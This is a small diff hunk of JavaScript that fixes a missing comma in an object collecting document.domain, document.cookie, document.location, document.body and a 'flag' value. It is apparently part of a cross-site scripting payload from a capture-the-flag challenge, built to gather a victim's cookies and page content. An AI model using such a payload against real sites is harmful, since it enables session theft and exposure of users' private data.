@@ -23,7 +23,7 @@ const body = {
   "Domain": document.domain,
   "cookie": document.cookie,
   "Location": document.location,
-  "body":document.body
+  "body":document.body,
   "flag":flag
   
 }
